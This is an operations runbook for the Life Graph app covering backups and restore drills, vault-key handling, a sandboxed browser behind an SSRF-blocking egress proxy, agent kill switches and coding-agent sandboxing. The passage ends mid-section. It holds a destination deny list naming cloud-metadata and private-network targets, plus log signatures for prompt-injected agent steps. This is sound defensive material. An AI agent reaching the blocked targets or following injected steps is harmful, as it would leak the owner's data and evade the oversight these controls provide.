# Operations Runbook — The Lifeline (F0)

> Backups and restore drills for Life Graph. Strategy: `docs/design/07_strategic_direction_2026-07.md` §D7.1 —
> *"Data loss is not an incident; it is the death of the product thesis."*

## What Runs Automatically (production stack)

The `backup` sidecar service in `docker-compose.production.yml` runs:

| Job | Schedule | Script | Audit trail |
|-----|----------|--------|-------------|
| Nightly backup | 02:00 UTC daily | `scripts/backup.sh` | `job_runs` row, `job_name='backup'` |
| Restore drill | Sunday 06:00 UTC | `scripts/verify_restore.sh` | `job_runs` row, `job_name='restore_drill'` |
| Backup retry | every 15 min after a failure (`BACKUP_RETRY_MINUTES`) | `scripts/backup.sh` | `job_name='backup'` |
| Off-site catch-up | hourly while `.offsite_pending` exists (`OFFSITE_RETRY_MINUTES`) | `scripts/backup.sh --offsite-only` | `job_name='backup_offsite'` |

Every run first waits for the database (`pg_isready`, up to `DB_WAIT_SECONDS`, default 600).
Docker's restart policy starts the sidecar at boot independently of compose's
`depends_on`, so without this wait the backup at container start ran before Postgres
was up — or before the compose network resolved its hostname — and was lost. A backup
at container start that falls inside `BACKUP_HOUR` counts as that day's backup.

Dumps and MinIO archives are written as `*.partial` and renamed only on success, so a
failed run leaves no empty file behind; the restore drill also verifies the newest
*non-empty* dump.

The sidecar reuses the postgres image (`Dockerfile.postgres`) so `pg_dump`/`pg_restore`
always match the server version (PG16). Dumps land in the `backup_data` volume
(`/backups` inside the container), retained `BACKUP_RETENTION_DAYS` days (default 30).

When `MINIO_DATA_DIR` points at a mount of the MinIO volume, each run also writes
`minio_<timestamp>.tar.gz` next to the dump, with the same retention. Mount the volume
read-only into the sidecar (e.g. `minio_data:/minio-data:ro`). Without it, uploaded
originals (voice notes, images, documents) have no backup — only the memories
extracted from them do.

Each dump has a sibling `life_graph_<timestamp>.graph` manifest: the Apache AGE label
inventory (`graph|label|kind|rows`) read from the **same snapshot** as the dump
(`pg_dump --snapshot`), so a restore can be held to exact graph counts.

`job_runs.status` for `backup`: `success` (dump, and the off-site copy when one is
configured), `partial` (dump fine, off-site copy skipped or failed — `error` says why),
`failed` (no dump). `backup_offsite` retries are `success` or `failed`. A failed backup,
a failed drill, and an off-site copy that has not succeeded for `OFFSITE_ALERT_HOURS`
(default 24) each write an owner notification (`notifications.source_type='backup'`,
once per kind per UTC day; recipients `BACKUP_ALERT_TENANTS`, else the tenant with the
most memories).

### Restoring an Apache AGE graph (why `restore.sh` is not a plain `pg_restore`)

AGE's catalog lives in two extension tables, `ag_catalog.ag_graph` and
`ag_catalog.ag_label`, and `ag_label` has a foreign key onto `ag_graph`. pg_restore does
not order data by foreign keys, so:

- `pg_restore -j N` loads `ag_label` alongside `ag_graph`, the COPY fails
  `fk_graph_oid`, and the graph returns with its vertex/edge tables but **zero labels**;
  cypher on that database crashed the server process (signal 11).
- `pg_restore --clean` into an existing database fails ("table X is for label X") and
  appends every vertex a second time.

`scripts/lib_backup.sh` (`restore_dump`) restores only into an empty database, in four
steps: schema → `ag_graph` then `ag_label` rows (serial) → all other data → indexes and
constraints (`RESTORE_JOBS` parallelism is safe for the last two). `restore.sh` restores
into a staging database, verifies it, and only then renames the current database to
`<name>_before_restore_<timestamp>` and the staging one into place. `ag_graph.graphid`
keeps the source's OID while the restored schema gets a new one; AGE 1.5 works with
that (MATCH, CREATE with existing and new labels were tested), so it is left as is.

### What the restore drill verifies

1. Latest dump restores into a scratch database (`life_graph_verify`) on the same server,
   using the procedure above. **Any** pg_restore error fails the drill.
2. Graph: `ag_graph`/`ag_label` rows, rows per label, vertex and edge totals equal the
   dump's manifest (older dumps without one: the live graph); every label table has a
   catalog row; every label's id sequence is ahead of its data. Only then does cypher
   run — a `MATCH` per label must return the manifest's count. (Cypher on a broken
   catalog can crash the server, and the drill runs on the live server.)
3. Row counts for `memories`, `sessions`, `capture_events`, `decisions`, `predictions`,
   `agent_tasks` — restored `memories` count must be ≥ 90% of live (`MIN_ROW_RATIO`).
   Each table is looked up in whichever schema holds it (`public` or `life_graph`);
   the drill log and `job_runs` result name tables schema-qualified.
4. Embedding sample: restored DB must contain non-null embeddings with the right dimensions.
5. Warns if the latest dump is older than 48h (nightly backup broken).
6. Scratch database is dropped afterwards; outcome recorded in `job_runs` (with the
   graph numbers under `result.graph`); a failure also notifies the owner.

### Who can read the dumps

Dumps are plaintext: every memory, every message. The scripts run under `umask 077` and
`chmod 600` their output, which works on a Linux filesystem (the `backup_data` volume).
On a Windows drive mounted into WSL (DrvFs, e.g. `/mnt/h`) without the `metadata` mount
option, chmod is silently ignored and every file shows `rwxrwxrwx`; what actually
controls access there is the Windows ACL. Restrict the backup folder on the Windows side
(remove `Authenticated Users` / `Users`, keep your account, `SYSTEM`, `Administrators`),
or mount the drive with `metadata` (`/etc/wsl.conf` `[automount] options = "metadata"`).
Encrypting local dumps is not implemented; the off-site copy is encrypted by restic.

**Untested backups don't count.** A `restore_drill` failure means your backups may be garbage — treat it as a P0.

## Off-Site (encrypted) Backups

Set in `.env.production`:

```bash
RESTIC_REPOSITORY=sftp:user@backup-host:/srv/restic-life-graph   # or s3:, b2:, rest:
RESTIC_PASSWORD=<strong-passphrase>
```

When set (and `restic` is installed in the image/host), `backup.sh` pushes the dump
directory off-site after each nightly run with retention 7 daily / 4 weekly / 6 monthly.
With `MINIO_DATA_DIR` set, restic backs up the raw MinIO directory (which deduplicates
between runs) and skips the local `minio_*.tar.gz`, which would re-upload in full nightly.

The off-site step is **best-effort**: the local dump has already succeeded, so an
unreachable repository does not fail the backup — the run is recorded as
`status='partial'` (`offsite: false`, `offsite_error`), a retry that still cannot upload
as `failed`, and after `OFFSITE_ALERT_HOURS` without a good copy the owner is notified.
(Before this, both were recorded as `success`, which hid a week of failed uploads.)
`backup.sh` probes the repository first (`RESTIC_PROBE_TIMEOUT`, default 60s), because
restic otherwise retries an offline backend for about 15 minutes. "Repository
unreachable" with the host answering on Tailscale but the port refusing means the
rest-server on the repository host is not running.

| Variable | Purpose |
|---|---|
| `RESTIC_REPOSITORY_FILE` | Read the repository URL from a file, keeping credentials embedded in a `rest:` URL out of compose files and `docker inspect` |
| `RESTIC_PASSWORD_FILE` | Same, for the encryption password (restic native) |
| `RESTIC_FORGET=0` | Skip forget/prune — required for an append-only repository |
| `RESTIC_PROBE_TIMEOUT` | Seconds to wait for the repository before skipping (default 60) |

**Append-only target (recommended for a second machine you own):** run
[`rest-server`](https://github.com/restic/rest-server) there with `--append-only`, bound
to a private address (e.g. its Tailscale IP), with a bcrypt `.htpasswd` entry —
rest-server 0.14 rejects `$6$` SHA-512 hashes. The backup host can then add snapshots
but never delete them, so a compromised backup host cannot erase history. Pruning must
run on the repository host itself (e.g. a weekly `restic forget ... --prune` timer),
and the backup side sets `RESTIC_FORGET=0`.

**Keep the encryption password somewhere other than the backed-up machine.** If that
machine is lost, a password stored only on it makes every off-site snapshot unreadable.

> `restic` is not bundled in `Dockerfile.postgres` by default. Either add
> `apt-get install restic` there, or run restic from the host against the
> `backup_data` volume mount point.

## Manual Operations

```bash
# One-off backup now
docker compose -f docker-compose.production.yml exec backup bash /scripts/backup.sh

# Run the restore drill now
docker compose -f docker-compose.production.yml exec backup bash /scripts/verify_restore.sh

# List backups
docker compose -f docker-compose.production.yml exec backup ls -lh /backups

# Check backup/drill history
docker compose -f docker-compose.production.yml exec postgres \
  psql -U life_graph -c "SELECT job_name, status, started_at, result FROM job_runs \
  WHERE job_name IN ('backup','restore_drill') ORDER BY started_at DESC LIMIT 14;"
```

## Dependencies: installing from `uv.lock`

`uv.lock` is the authority for which package versions run. CI (`uv sync
--locked`), the Docker image (`Dockerfile`, same command) and a release all
install from it, so what was tested is what ships. `pyproject.toml` only holds
the ranges; see the version-policy comment at the top of its `dependencies`.

**Docker deployments** (`scripts/deploy.sh`, `docker-compose.production.yml`)
need nothing extra: `docker compose build` installs from the lock, on Python
3.12, and fails the build if `pyproject.toml` and `uv.lock` disagree.

**A host venv** (e.g. `~/.venvs/life-graph`) is not touched by any script —
it was installed by hand with pip, so its versions drift from the lock (on
2026-11-20 it had fastapi 0.141.1 / litellm 1.103.0 / pr-agent 0.47.0 against
the locked 0.165.0 / 1.105.1 / 0.50.0). At release, bring it to the lock from
the checkout the venv's editable install points at, uv 0.12.14:

```bash
cd <checkout>
export UV_PROJECT_ENVIRONMENT="$HOME/.venvs/life-graph"   # sync THAT venv, not ./.venv
EXTRAS="--extra dev --extra multimodal --extra cold-start --extra watchers --extra browser-sandbox"
# add --extra local-nlp for in-process embeddings (CPU torch + sentence-transformers)

# 1. Preview: lists every install/upgrade/downgrade, changes nothing.
uv sync --locked --inexact --python 3.12 $EXTRAS --dry-run

# 2. Apply. --locked refuses a stale lock; downloads are checked against the
#    sha256 in uv.lock. --inexact leaves packages that are not in the lock
#    (pip, the spaCy model, anything installed by hand) alone; drop it to make
#    the venv match the lock exactly.
uv sync --locked --inexact --python 3.12 $EXTRAS

# 3. The spaCy model is not on PyPI, so not in the lock (only if spaCy is used):
uv pip install --python "$UV_PROJECT_ENVIRONMENT/bin/python" \
  "en_core_web_sm @ https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-3.8.0/en_core_web_sm-3.8.0-py3-none-any.whl#sha256=1932429db727d4bff3deed6b34cfc05df17794f4a52eeb26cf8928f7c1a0fb85"
```

Then restart the services that use the venv. Roll back by checking out the
previous commit and running the same `uv sync` (the old lock reinstalls the
old versions).

**Advisories.** The CI `dependency-audit` job runs pip-audit over the whole
lock and is blocking. Advisories that cannot be fixed from this repo yet are
listed, with a reason and a review-by date at most 30 days out, in
`.github/pip-audit-ignore.txt`; an expired entry fails CI too.

## Connectors: Calendar, Email, Contacts, Tasks, GitHub

Read-only; set up in the dashboard under **Settings → Connected accounts**
(specs: `docs/specs/connectors.md`, `docs/specs/connector-contacts.md`,
`docs/specs/connector-github.md`, `docs/specs/connector-tasks.md`). Each
account picks its method; the form suggests one.

| Method | Setup | Notes |
|---|---|---|
| App password (mail) | Google Account → Security → 2-Step Verification → App passwords | Missing page = the Workspace admin disabled it |
| Calendar link | Google Calendar → Settings → the calendar → *Secret address in iCal format* | The link is a credential; Google refreshes it with a lag |
| Google sign-in (OAuth) | Once: Google Cloud project, enable the Gmail, Calendar, **People** and **Tasks** APIs you use, set the consent screen to **In production** (in Testing, sign-ins expire after 7 days), OAuth client type **Desktop app**, paste its JSON in the form | Read-only scopes; sign in from the machine running the API (loopback redirect). Contacts without the People API enabled fail with a message saying so |
| vCard file (contacts) | contacts.google.com → Export → vCard, then **Import vCard** on the account | No credential. Import a newer export to update; each import replaces that account's contacts |
| Access token (GitHub) | github.com → Settings → Developer settings → **Fine-grained tokens**: all repositories; read-only Pull requests, Issues, Commit statuses, Checks | One per GitHub account or organisation. A classic token that can write is refused. Expiry → **Reconnect needed** |

- Contacts: saved contacts and Google's "Other contacts" (addresses kept from
  mail), synced every 6 h. **Cloud visibility** on each contacts account picks
  which fields cloud chat may see (default: names, company and title, email
  addresses, birthdays; phones, postal addresses and notes are off). Contacts are
  not time-limited: they mirror the source.
- GitHub: review requests, your open PRs (CI, review decision, conflicts) and
  assigned issues, every 15 min; titles and status only. Private repos are counts
  for cloud chat unless the account shares private titles.
- Google Tasks: open tasks and those done in the last week, every 15 min, read-only
  (`tasks.readonly`). Notes never leave the machine; a promise already on the list
  shows "in Tasks".
- Bills & renewals: read from mail by the local summariser (card statements,
  utilities, broadband, insurance, domains). Brief section and Today card; a
  payment-confirmation email closes its bill. Amounts never leave the machine;
  `LIFE_GRAPH_CONNECTOR_BILLS_CLOUD=counts` reduces the rest to counts. Older mail:
  Settings → the mail account → **Find bills in past mail** (60 days, local model).

- Credentials: `~/.config/life-graph/connectors/<tenant>/<account-id>.json` (0600).
  They are **not** in the database backups — keep your passwords in a password
  manager; reconnecting is two minutes.
- Sync: every 15 min per account (worker job `sync_connectors`, runs every 5 min);
  failures back off up to 6 h; a refused credential sets **Reconnect needed** and
  stops retrying. Retention: mail 90 days, events −90/+365 days (nightly purge).
- What the cloud sees: see the exposure table in the spec. Mark employer or other
  sensitive accounts **Local only** (Settings) — cloud chat and Telegram/push then
  get counts only.
- Checks: `GET /api/v1/connectors` (status, last error, item counts per account).

## The Secret Vault Key (`vault_secrets`)

Secrets the browser agent fills in — a net-banking password, an OTP, a card —
live in `vault_secrets` as ciphertext only. Everything else in the system
carries `vault://<handle>`, which is useless without the key. The key is
therefore the one piece of state that is **not** in the database and **not**
in the database backups. Code: `life_graph/services/vault.py`.

| | |
|---|---|
| Algorithm | AES-256-GCM, fresh 12-byte nonce per secret, stored `nonce \|\| ciphertext+tag` |
| Bound to | `tenant_id:handle` as additional authenticated data — a row copied to another tenant, or a handle repointed at another row, does not decrypt |
| Key | 32 bytes, from `LIFE_GRAPH_VAULT_KEY` (urlsafe base64 or hex) |
| Fallback | `LIFE_GRAPH_VAULT_KEY_FILE` → `~/.config/life-graph/vault.key`, mode 0600 |
| Read back | only `vault.resolve_for_origin()`, in-process, against an origin the owner listed for that secret. There is no endpoint, no admin screen and no bulk-decrypt tool |

### Provisioning

```bash
# Generate a key and put it where the app will read it
python -c "import base64,os;print(base64.urlsafe_b64encode(os.urandom(32)).decode())"
# → .env as LIFE_GRAPH_VAULT_KEY=…, or the secret store the stack reads
```

With neither the env var nor the key file set, the app **generates** a key
into `~/.config/life-graph/vault.key` (0600) on first use and logs
`Generated a new vault key at … — back it up`. That keeps a fresh self-host
working, and it means that until somebody backs that file up the secrets exist
on exactly one disk. For the production stack, set the env var explicitly: a
container that regenerates the key on each new volume silently loses every
stored secret.

A key that is set but does not decode to 32 bytes fails **loudly**
(`VaultKeyMissingError`) the first time a secret is stored or resolved, with
the generate-one command in the message. It is not silently replaced.

### Backup and recovery

- Back the key up **separately from the database dump**. A backup that holds
  both is a backup that holds the plaintext, which is the thing the encryption
  was for. A password manager entry or a sealed secret is enough — it is 44
  characters.
- On a restore, put the key back **before** the app comes up. Restoring a dump
  without the key leaves every vault secret permanently unreadable; the API
  answers "secret not found" for each one, which is correct but easy to
  misread as data loss elsewhere.
- Losing the key loses every secret in it, by design. Recovery is re-entering
  them; nothing else can.

### Rotation

There is no bulk re-wrap function, on purpose: a tool that decrypted every row
at once would be a second route back to plaintext, and `resolve_for_origin`
being the only one is what makes a leaked handle harmless. So rotation is
manual and visible:

1. Store the new key (`LIFE_GRAPH_VAULT_KEY`), keeping the old one to hand.
2. Restart the app — the key is cached per process.
3. In the dashboard, revoke each vault secret and re-enter it. Revoking blanks
   the ciphertext, so the old value is not recoverable from a later backup.
4. Update anything holding an old `vault://` handle: re-storing mints a new
   handle. (Standing browser errands and saved steps are the usual holders.)
5. Destroy the old key once nothing refuses to resolve.

Skipping step 3 leaves old rows undecryptable — they refuse as "secret not
found", not as an error naming the key — so rotate deliberately, not as a
routine hygiene task.

### Checks

```bash
# Secrets exist and no plaintext column does
docker compose -f docker-compose.production.yml exec postgres \
  psql -U life_graph -c "\d vault_secrets" | grep -E 'encrypted_value|allowed_origins'

# The key file, if that is what the deployment uses
stat -c '%a %n' ~/.config/life-graph/vault.key   # expect 600
```

- `GET /api/v1/vault` lists secrets as metadata only — label, type, allowed
  origins, use count. There is no field in that response that could carry a
  value, not even a length (a length narrows a guess at a PIN).
- Logs name a secret by **label**, never by value. A log line reading
  `Vault: refused <label> … is not an allowed origin` is the origin check
  doing its job: a handle was used on a page the owner did not list for it.
  Repeated ones are worth looking at.

## Disaster Recovery

```bash
# 1. Provision the stack (postgres up, app down)
docker compose -f docker-compose.production.yml up -d postgres

# 2. Restore the latest dump (interactive confirmation; --yes skips it). Restores into a
#    staging database, verifies the graph against life_graph_<TIMESTAMP>.graph, then
#    swaps it in and keeps the old database as life_graph_before_restore_<ts>.
#    Never use plain `pg_restore --clean` or `pg_restore -j` (see "Restoring an Apache
#    AGE graph" above).
docker compose -f docker-compose.production.yml run --rm backup \
  bash /scripts/restore.sh /backups/life_graph_<TIMESTAMP>.dump

# 3. If restoring from off-site: restic restore latest --target /restore first

# 4. Put the vault key back BEFORE the app starts (it is not in the dump)
#    — LIFE_GRAPH_VAULT_KEY in the env, or ~/.config/life-graph/vault.key (0600)

# 5. Bring the rest up and smoke-test
docker compose -f docker-compose.production.yml up -d
curl -fsS http://localhost/health
```

## Monitoring Checklist (weekly)

- [ ] `job_runs` shows a `backup` success for every night this week (`partial` = off-site copy missing)
- [ ] `job_runs` shows a `restore_drill` success for Sunday
- [ ] Off-site repo (`restic snapshots`) grew this week
- [ ] Backup volume disk usage under control (`ls -lh /backups`)
- [ ] The vault key is still backed up somewhere other than the database dump


## Isolated Browser Runtime and Egress Proxy Deployment

The autonomous browser execution stack runs in an isolated container topology defined in `compose.sandbox.yaml`:

| Container | Image | Purpose | Networks | Exposed Ports |
|---|---|---|---|---|
| `browser` | `life-graph-sandbox-browser:dev` | Headless Chromium instance running under dumb-init | `sandbox_control`, `sandbox_egress` | None (internal to Docker networks) |
| `egress` | `life-graph-sandbox-egress:dev` | Forward HTTP proxy (`life_graph.services.egress_proxy`) with destination validation and IP pinning | `sandbox_egress`, `sandbox_outbound` | None (internal to Docker networks) |

### 4-Network Isolation Topology

The container stack enforces strict network isolation across four segregated bridges:

1. **`life_graph_sandbox_control` (`172.24.0.0/16`)**:
   - Internal bridge connecting the host application (`life-graph` API / worker) to the `browser` container on port 9222.
   - Provides no external internet access (`internal: true`).
2. **`life_graph_sandbox_egress` (`192.168.80.0/24`)**:
   - Internal point-to-point bridge connecting `browser` to the `egress` proxy on port 8080 (`internal: true`).
   - The browser container routes all web traffic through `http://egress:8080`.
3. **`life_graph_sandbox_outbound` (`192.168.32.0/24`)**:
   - Standard bridge with NAT allowing the `egress` proxy to communicate with external web origins.
   - The `browser` container is **not** attached to this network.
4. **Host / App Network**:
   - The host application accesses the browser control channel via Docker port binding or container IP resolution (`ws://<browser-ip>:9222/<token>`).

### Control Channel Authentication

Direct access to the browser WebSocket is guarded by an ephemeral path token:
- Environment variable: `SANDBOX_BROWSER_PATH`.
- Minimum length: 32 hexadecimal characters (128-bit entropy).
- Verification:
  - Connections to `ws://browser:9222/` without the path token are rejected with `400 Bad Request`.
  - Connections with a mismatched token are rejected with `400 Bad Request`.
  - Correct connections (`ws://browser:9222/<token>`) negotiate WebSocket upgrade.
- Token redaction: Client libraries and loggers mask the path token in URLs, exceptions, and audit logs.

### Egress Proxy Enforcement

All browser web requests pass through `life_graph.services.egress_proxy`:
- **Destination Validation (`validate_destination_url`)**:
  - Rejects loopback addresses (`127.0.0.0/8`, `::1`).
  - Rejects private RFC1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
  - Rejects cloud metadata services (`169.254.169.254`, `metadata.google.internal`).
  - Rejects Carrier-Grade NAT (`100.64.0.0/10`), link-local, multicast, and broadcast addresses.
  - Rejects dangerous schemes (`file://`, `javascript:`, `data:`, `ftp://`).
  - Rejects non-web ports (ports other than 80 and 443).
- **IP Pinning**:
  - Resolves hostnames once via trusted DNS and binds socket connections directly to the validated IP, eliminating DNS rebinding attacks (`Time-of-Check to Time-of-Use`).
- **Origin Fencing**:
  - Enforces that all HTTP requests and redirects remain within the owner-approved target origins. In-flight redirects off-origin fail closed with `DestinationRefusedError` and halt errand execution before side-effects.

## Durable Authorization Schema and Migrations

Durable capabilities and standing rules persist in PostgreSQL (`revision 059`):

### Schema (`authorization_capabilities`)

```sql
CREATE TABLE authorization_capabilities (
    capability_id VARCHAR(64) PRIMARY KEY,
    tenant_id VARCHAR(64) NOT NULL,
    errand_id VARCHAR(64) NOT NULL,
    step_index INTEGER NOT NULL,
    action_types TEXT[] NOT NULL,
    target_origins TEXT[] NOT NULL,
    target_selector TEXT,
    parameters_hash VARCHAR(64),
    one_use BOOLEAN NOT NULL DEFAULT TRUE,
    expires_at TIMESTAMPTZ,
    spent_at TIMESTAMPTZ,
    revoked_at TIMESTAMPTZ,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_auth_caps_tenant ON authorization_capabilities(tenant_id);
CREATE INDEX idx_auth_caps_errand ON authorization_capabilities(errand_id);
CREATE INDEX idx_auth_caps_lookup ON authorization_capabilities(capability_id, tenant_id);
```

### Exact-Step Binding and Atomic Consumption

Authorization checks enforce exact multi-attribute binding:
- `capability_id` must match.
- `tenant_id` must match (prevents cross-tenant attacks).
- `errand_id` must match (prevents cross-errand reuse).
- `step_index` must match (prevents cross-step privilege escalation).
- `target_selector` must match canonical selector.
- `parameters_hash` must match SHA-256 hash of canonical action parameters.

Atomic consumption is executed via a single SQL CAS query:
```sql
UPDATE authorization_capabilities
SET spent_at = :now
WHERE capability_id = :capability_id
  AND tenant_id = :tenant_id
  AND errand_id = :errand_id
  AND step_index = :step_index
  AND (target_selector IS NULL OR target_selector = :target_selector)
  AND (parameters_hash IS NULL OR parameters_hash = :parameters_hash)
  AND spent_at IS NULL
  AND (expires_at IS NULL OR expires_at > :now)
  AND revoked_at IS NULL
RETURNING capability_id;
```
If 16 workers or threads race to consume the same one-use capability simultaneously, exactly 1 worker succeeds; all 15 competing workers receive 0 rows and are denied with `ALREADY_CONSUMED`.

## Restart, Recovery and Multi-Worker Behavior

1. **Worker Queuing (`arq` / Redis)**:
   - Autonomous errands are dispatched to Redis queues and consumed by background workers.
   - If a worker crashes mid-errand, the errand run record is marked `FAILED` or times out via heartbeat expiry.
2. **Crash Invariants**:
   - Because authorization capabilities are committed to PostgreSQL prior to step execution, in-flight capabilities survive worker crashes.
   - If an errand step already spent its capability (`spent_at IS NOT NULL`), a restarted worker cannot replay that step. It must request a new owner approval.
3. **Application Startup Attachment**:
   - On application startup (`life_graph/main.py`), durable stores are attached to process-wide factories via `attach_durable_stores()`.
   - Verified in `test_the_application_startup_attaches_the_durable_stores`.

## Browser Session Cleanup and Retention

1. **Context Lifecycle**:
   - Each browser errand allocates a dedicated, fresh browser context (`browser.new_context()`).
   - Context is wiped upon errand termination (success, failure, or cancellation).
   - Cookies, local storage, indexedDB, and cache are zeroed out between errands (`reset_context()`).
2. **Audit Retention**:
   - Errand run summaries and step outcomes are recorded in `job_runs` / `errand_runs`.
   - All vaulted passwords, session secrets, and credentials filled during the errand are redacted with `[redacted]` before persisting logs.
   - Page DOM text is stripped of scripts, sanitized, and enclosed in `<untrusted>` tags.

## Incident Investigation and Audit Logging

Audit logs capture security events across browser errands and capabilities:

### Key Event Signatures

| Event Pattern | Meaning | Investigation Action |
|---|---|---|
| `DestinationRefusedError` | Attempted SSRF, metadata access, or private IP navigation | Inspect target URL in errand plan; verify prompt injection in preceding steps |
| `ALREADY_CONSUMED` | Replayed capability or duplicate worker execution | Check worker concurrency logs; ensure no rogue loops |
| `TENANT_MISMATCH` | Cross-tenant capability consumption attempt | Critical security event: inspect caller origin and authentication token |
| `STEP_MISMATCH` | Attempt to use approval granted for step $N$ on step $M$ | Inspect errand step planner for prompt injection or drift |
| `PARAMETERS_MISMATCH` | Action parameters altered after owner approval | Inspect DOM mutation or script injection tampering with form values |
| `origin changed mid-errand` | Navigation redirected off approved origin during execution | Domain hijacking or malicious redirect on target site |

### Log Inspection Commands

```bash
# Search for denied egress and SSRF attempts
grep -E "DestinationRefusedError|Egress proxy: refused" logs/api.log logs/worker.log

# Search for capability verification failures
grep -E "deny/denied|ALREADY_CONSUMED|TENANT_MISMATCH|STEP_MISMATCH" logs/worker.log

# Search for origin redirect violations
grep "origin changed mid-errand" logs/worker.log

# Inspect machine-readable adversarial audit report
cat evals/adversarial_security_report.json | jq .
```

## Emergency Kill Switches

Use these if an agent, errand or browser session is doing something it should not. They are listed fastest and most targeted first. Every command below is checked against the code and the prod layout; prod runs through `./dev.sh`, with Postgres in the `life_graph_db` container and the tenant `raja`.

### 1. Pause autonomy (the built-in kill switch)

This is one call, per tenant. It does these things:
- **No new autonomous work starts.** Each of these checks the switch before it starts anything:
  - auto-fix actions (`AutoFixService._run_action`)
  - scheduled jobs
  - watcher findings
  - delegation to another persona
  - the dev runner's claims (queued tasks wait)
  - errand approval taps (no new capability is issued)
- **Running dev tasks are cancelled.** Each goes through the normal cancel, so its container or process group stops and its capabilities are revoked.
- **Live capabilities are revoked:** the owner's approved, unspent mandates for errand steps.
- **Pause and resume are logged.** Each writes one `audit_log` row (`action_type = kill_switch`) naming who did it.

What it does **not** stop (since 2026-11-25):
- A chat turn you send yourself still runs; it cannot delegate while paused.
- A persona or scheduled run that was already running when you paused finishes its current turn. Stop the API (step 4) if that is not acceptable.

```bash
cd /mnt/h/DevTools/Projects/life-graph-prod
K=$(grep -E '^LIFE_GRAPH_OWNER_API_KEYS=' .env | cut -d= -f2- | cut -d, -f1 | tr -d "\"'")
H=(-H "Authorization: Bearer $K" -H "X-Tenant-ID: raja")
curl -s -X POST "${H[@]}" http://127.0.0.1:8080/api/v1/autonomy/safety/kill-switch/pause
curl -s "${H[@]}" http://127.0.0.1:8080/api/v1/autonomy/safety/kill-switch     # check: autonomy_paused true
unset K H
```

- **200** means paused, with `capabilities_revoked: N` and `dev_tasks_cancelled: N` (`-1` if cancelling failed; the pause still stands).
- **503** means autonomy *is* paused but the revocation failed. Call `pause` again; it is safe to repeat.
- It fails closed. If the flag cannot be read, autonomy counts as paused. Other workers pick up a change within 15 s, because that is how long the pause state is cached.
- **Resume** with `POST .../kill-switch/resume`. It needs an owner key or a paired phone; any key can pause.

### 2. Revoke capabilities directly in the database (if the API is down)

The capabilities live in the `capabilities` table (migration 059). This is the same statement the kill switch runs (`durable_store.revoke_all`):

```bash
cd /mnt/h/DevTools/Projects/life-graph-prod
U=$(grep -E '^LIFE_GRAPH_DATABASE_URL=' .env | sed -E 's#.*://([^:@/]+).*#\1#')
# one tenant:
docker exec life_graph_db psql -U "$U" -d life_graph -c "UPDATE capabilities SET revoked = true WHERE tenant_id = 'raja' AND revoked = false;"
# every tenant:
docker exec life_graph_db psql -U "$U" -d life_graph -c "UPDATE capabilities SET revoked = true WHERE revoked = false;"
```

This does not pause autonomy. Do step 1 as well once the API is back.

### 3. Stop dev-agent work

- Cancel one task: `POST /api/v1/agent-tasks/{task_id}/cancel`. It also revokes that task's capabilities.
- Stop every dev task at once: `systemctl --user stop life-graph-dev-runner`. A running task gets SIGTERM, with up to 26 min to stop (`TimeoutStopSec`). Start it again with `systemctl --user start life-graph-dev-runner`.

### 4. Turn browser errands off

Set the following in prod `.env`, then run `./dev.sh restart`. An unknown value also counts as disabled.

```bash
LIFE_GRAPH_BROWSER_SANDBOX_MODE=disabled
```

The browser sandbox containers come from `compose.sandbox.yaml` (services `browser`, `egress`, `workspace`). They are not running in prod today. If they ever are, stopping them cuts the browser off at once:

```bash
docker compose -f compose.sandbox.yaml stop browser egress
```

## Monitoring and Alerting Checklist

Configure alerts in Cloud Monitoring, Grafana, or local alerting for:

- [ ] **Egress Violations**: Alert on any HTTP 403 / `DestinationRefusedError` from `egress_proxy`.
- [ ] **Replay Attempts**: Alert on any `ALREADY_CONSUMED` check result.
- [ ] **Cross-Tenant Attempts**: P0 Alert on any `TENANT_MISMATCH` event.
- [ ] **Budget Cap Exhaustion**: Alert when hourly spend reservation exceeds ceiling.
- [ ] **Subsystem Health**: Continuous poll of `GET /health`; alert if `status != 'healthy'` or any of the 27 subsystems fail.

## Known Limitations and Unverified Controls

Per the Definition of Done in `docs/AI_WORK_ORDER.md`, the following boundaries must be clearly distinguished:

| Control | Status | Verified Scope | Unverified / Open Limitation |
|---|---|---|---|
| Exact-step approval binding | Complete | Unit, Integration, Concurrency (16 threads), Adversarial | Live UI click confirmation in production mobile app |
| Isolated browser container stack | Complete | Operational (Docker compose), Network isolation, Path token auth | Multi-node Kubernetes or Nomad cluster deployments |
| Egress proxy enforcement | Complete | Pinned IP, DNS rebinding, Cloud metadata, RFC1918, Schemes | Advanced QUIC / HTTP/3 UDP proxying (currently TCP HTTP/HTTPS only) |
| Durable authorization persistence | Complete | PostgreSQL schema, CAS update, Indexing, Expiry/Revocation | Distributed active-active multi-region database replication |
| Confidence calibration | Complete | Calibration (N=60) & held-out (N=60) evaluation, ECE, Brier | Production domain adaptation on newly introduced knowledge verticals |
| External financial spend | Complete | Spend reservation logic, concurrency locks, ledger | Live banking API debit transactions with real currency |

## Dev-agent execution runtime

Where coding drivers run, and how to run them safely. Design and threat model:
`docs/design/adr-secure-task-runtime.md`. Probe evidence: `docs/security/`.

### Execution boundary per driver

| Driver | Where it runs | Shell | Environment |
|---|---|---|---|
| `claude_code`, `DRIVER_CLAUDE_SANDBOX=task` | per-task container; worktree is the only host path; internal network; egress only via allowlisting proxy | yes, inside the container | built in code, validated (no `LIFE_GRAPH_*`, no secrets) |
| `claude_code`, `=docker` (legacy) | container on docker's default bridge (open network) | yes, inside the container | as above, minus the network policy |
| `claude_code`, `=none` | host, as the API user | **denied** unless `DRIVER_ALLOW_HOST_SHELL=true` | allowlist (`drivers/host_exec.py`) |
| `opencode` (**parked**: `DRIVER_OPENCODE_ENABLED=false`, reports unavailable) | host, as the API user | **denied** unless `DRIVER_OPENCODE_ALLOW_BASH=true` | allowlist |
| `local` | in the API process | `run_command`: `TOOL_SHELL_MODE=allowlist` (read-only programs) | `shell_allowlist.child_env()`, also in `full` mode while a driver has confined the tools to a task (`confine_to`) |
| verifiers | `VERIFIER_SANDBOX=docker`: checks in a `--network none` container; dependency setup on an internal network, egress only via the proxy to package registries (see "Verifier setup egress"). `=none`: code-executing checks are **inconclusive** unless `VERIFIER_ALLOW_HOST_EXECUTION=true` | — | — |

### Enable the task runtime

```bash
# --label life-graph.keep=true is required: the host's weekly `docker system prune`
# (/etc/cron.weekly/gh-runner-prune) skips only labelled images. These images run for
# minutes per task, so without the label they are deleted after 7 days (decision log D20).
